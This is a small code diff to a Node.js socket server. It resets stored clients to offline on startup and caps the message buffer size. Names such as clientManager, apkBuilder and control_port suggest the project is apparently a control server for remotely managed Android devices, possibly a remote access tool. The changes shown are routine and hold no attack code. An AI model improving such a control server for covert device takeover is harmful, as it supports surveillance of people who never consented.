@@ -23,8 +23,16 @@ global.app = app;
 global.clientManager = clientManager;
 global.apkBuilder = apkBuilder;
 
-// spin up socket server
-let client_io = IO(CONST.control_port);
+// Mark all clients as offline on startup to prevent state drift
+db.maindb.get('clients').value().forEach(client => {
+    client.isOnline = false;
+});
+db.maindb.write();
+
+// spin up socket server with memory-safe buffer limits
+let client_io = IO(CONST.control_port, {
+    maxHttpBufferSize: 10 * 1024 * 1024 // 10MB limit to prevent OOM
+});
 
 client_io.sockets.pingInterval = 30000;
 client_io.on('connection', (socket) => {
